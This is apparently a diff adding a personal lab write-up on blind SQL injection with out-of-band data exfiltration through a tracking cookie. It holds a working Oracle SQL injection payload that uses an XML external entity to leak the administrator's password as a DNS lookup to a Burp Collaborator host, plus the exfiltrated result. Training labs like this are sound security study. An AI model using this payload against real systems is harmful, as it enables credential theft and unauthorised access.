@@ -1,0 +1,17 @@
+Lab #16 - Blind SQL injection with out of band data exfiltration
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+1) Exploit SQLi to output the password of the administrator user
+2) Login as the administrator user
+
+Analysis:
+
+ztw6rzfcq344wygpsa01r85bg2msah.oastify.com
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.ztw6rzfcq344wygpsa01r85bg2msah.oastify.com"> %remote;]>'),'/l') FROM dual)--
+
+
+Result:
+ti5r523b08rd2zqqv45k.ztw6rzfcq344wygpsa01r85bg2msah.oastify.com
